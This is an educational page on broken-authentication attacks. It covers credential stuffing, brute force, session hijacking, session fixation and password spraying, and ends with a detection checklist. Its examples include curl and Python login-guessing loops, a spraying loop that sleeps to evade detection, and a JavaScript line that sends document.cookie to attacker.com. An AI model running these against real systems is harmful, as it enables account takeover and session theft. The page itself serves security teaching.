# Broken Authentication - Attack Vectors

## Common Attack Methods

### 1. Credential Stuffing

Attackers use lists of breached username/password combinations:

```bash
# Example attack with curl
for cred in credentials.txt; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    curl -X POST https://target.com/login          -d "username=$username&password=$password"
done
```

**Impact**: Mass account compromise

### 2. Brute Force Attack

Systematically trying password combinations:

```python
import requests

usernames = ['admin', 'user', 'test']
passwords = ['password', '123456', 'admin123']

for user in usernames:
    for pwd in passwords:
        response = requests.post(
            'http://target.com/login',
            data={'username': user, 'password': pwd}
        )
        if response.status_code == 200:
            print(f"Found: {user}:{pwd}")
```

### 3. Session Hijacking

Stealing session tokens:

```javascript
// If session ID is in URL or accessible to JavaScript
document.cookie  // Steal all cookies
localStorage.getItem('session')  // Steal from storage

// Send to attacker
fetch('https://attacker.com/steal?cookie=' + document.cookie)
```

### 4. Session Fixation

Force user to use attacker's session ID:

```
1. Attacker gets session ID: SESSIONID=abc123
2. Attacker sends victim link: https://bank.com/login?SESSIONID=abc123
3. Victim logs in using that session
4. Attacker now has authenticated session
```

### 5. Password Spray Attack

Try common passwords against many accounts:

```python
common_passwords = ['Password123!', 'Welcome1', 'Company123!']
usernames = get_all_usernames()  # From OSINT

for password in common_passwords:
    for user in usernames:
        try_login(user, password)
        sleep(5)  # Avoid detection
```

## Detection and Monitoring

Watch for:
- Multiple failed login attempts
- Logins from unusual locations
- Concurrent sessions from different IPs
- Rapid successive login attempts
- Access to multiple accounts from same IP
